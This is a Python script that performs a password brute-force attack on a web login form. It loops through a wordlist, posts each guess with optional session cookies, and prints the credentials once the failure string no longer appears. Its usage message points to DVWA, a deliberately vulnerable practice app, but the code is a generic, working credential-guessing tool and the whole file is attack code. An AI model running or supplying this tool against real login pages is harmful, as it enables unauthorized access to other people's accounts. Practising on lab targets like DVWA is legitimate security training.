import requests
import sys
import os
import ast  # To safely parse cookies as a dictionary

def cracking(username, url, passwdfile, fail_string, cookies=None):
    try:
        # Open and read the password file
        with open(passwdfile, 'r') as passwords:
            for password in passwords:
                password = password.strip()
                print(f'Trying: {password}')
                data = {'username': username, 'password': password, 'Login': 'Login'}

                # Send POST request with or without cookies
                if cookies:
                    response = requests.post(url, data=data, cookies=cookies)
                else:
                    response = requests.post(url, data=data)

                # Check the response for the failure string
                if fail_string in response.content.decode():
                    continue
                else:
                    print(f'Found username ==> {username}')
                    print(f'Found password ==> {password}')
                    return  # Exit after finding the correct password
        print('No match found')
    except FileNotFoundError:
        print(f"Error: Password file '{passwdfile}' not found.")
        sys.exit(1)
    except requests.exceptions.RequestException as e:
        print(f"Error: Failed to connect to the URL. Details: {e}")
        sys.exit(1)

if __name__ == "__main__":
    # Check if the correct number of arguments is provided
    if len(sys.argv) < 5 or len(sys.argv) > 6:
        print("Usage: python bruteforce_dvwa.py <url> <username> <password_file> <fail_string> [<cookies>]")
        sys.exit(1)

    # Extract arguments
    url = sys.argv[1]
    username = sys.argv[2]
    passwdfile = sys.argv[3]
    fail_string = sys.argv[4]
    cookies = None

    # Parse cookies if provided
    if len(sys.argv) == 6:
        try:
            cookies = ast.literal_eval(sys.argv[5])  # Safely parse cookies as a dictionary
        except (SyntaxError, ValueError):
            print("Error: Cookies must be provided as a valid dictionary string, e.g., \"{'PHPSESSID': 'abc123', 'security': 'low'}\"")
            sys.exit(1)

    # Validate the password file
    if not os.path.isfile(passwdfile):
        print(f"Error: Password file '{passwdfile}' does not exist.")
        sys.exit(1)

    # Start cracking
    cracking(username, url, passwdfile, fail_string, cookies)
